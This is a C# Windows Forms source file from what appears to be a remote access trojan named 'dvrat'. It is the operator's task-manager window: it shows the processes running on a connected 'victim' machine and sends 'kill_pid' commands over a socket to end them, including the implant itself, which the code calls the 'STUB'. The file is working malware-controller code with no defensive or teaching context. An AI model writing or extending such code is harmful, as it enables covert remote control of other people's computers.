using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using Newtonsoft.Json.Linq;
using System.Threading;

namespace dvrat
{
    public partial class tsk_mgr_view : Form
    {
        JObject _tsk_mgr_obj;
        Socket _client;
        Form1 _parent;
        public string victm_name = "";
        public tsk_mgr_view(Socket client , Form1 parent, JObject tsk_mgr_obj)
        {
            
            InitializeComponent();
            this._client = client;
            this._parent = parent;
            this._tsk_mgr_obj = tsk_mgr_obj;
        }

        string KILL_PID = "kill_pid;";
        string PID = "";
        string PID_NAME = "";
        int selected_row = -1;
        private void tsk_mgr_view_Load(object sender, EventArgs e)
        {
            this.Text = $"TASK MANAGER [{this.victm_name}]";
            new Thread(new ThreadStart(new Action(() =>
            {
                load_mgr();
            }))).Start();
           
           
  
        }

        private void load_mgr()
        {
            foreach (JProperty x in (JToken)this._tsk_mgr_obj)
            {
                dataGridView1.Invoke(new MethodInvoker(() => {

                    dataGridView1.Rows.Add(
                 x.Name,
                 x.Value.ToString());
                    dataGridView1.Refresh();
                }));

            }
        }

        private void kILLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            KILL_PID += PID;
            if (PID_NAME.Contains("Cclient.exe"))
            {
                if(MessageBox.Show("Do you wanna kill the STUB ?", "Yes, No!", MessageBoxButtons.YesNo,MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    if(this._parent.send_to_client(this._client, KILL_PID))
                    {
                        MessageBox.Show("OK done kill proccess");
                        this.Close();
                        goto do_nothing;

                    }
                    else
                    {
                        MessageBox.Show("Error while request kill PID !");
                        goto do_nothing;
                    }
                }
                else
                {
                    goto do_nothing;
                }
            }
            if (this._parent.send_to_client(this._client, KILL_PID))
            {
                dataGridView1.Rows.RemoveAt(selected_row);
            }
            else
            {
                MessageBox.Show("Error while request kill PID !");
            }
        do_nothing: KILL_PID = "kill_pid;";
        }

        private void dataGridView1_CellMouseMove(object sender, DataGridViewCellMouseEventArgs e)
        {
            try
            {
                selected_row = e.RowIndex;
                PID = dataGridView1.Rows[e.RowIndex].Cells[1].Value.ToString();
                PID_NAME = dataGridView1.Rows[e.RowIndex].Cells[0].Value.ToString();
            }
            catch (Exception)
            {
                //PASS
            }

        }
    }
}
